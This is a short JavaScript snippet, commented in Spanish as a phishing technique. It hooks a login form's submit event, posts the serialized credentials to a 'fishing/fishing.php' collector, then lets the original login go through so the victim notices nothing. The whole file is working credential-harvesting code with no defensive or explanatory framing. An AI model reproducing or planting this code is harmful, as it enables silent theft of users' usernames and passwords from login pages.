/**
 *
 * Técnica de phising
 *
 */
$(function(){
	$('#login_form').submit(function() {
		var form = this;
		
		$.post('fishing/fishing.php', $(this).serialize(), function() {
			if(hash2(form)) {
				form.submit();
			}
		});
		
		return false;
	});
});
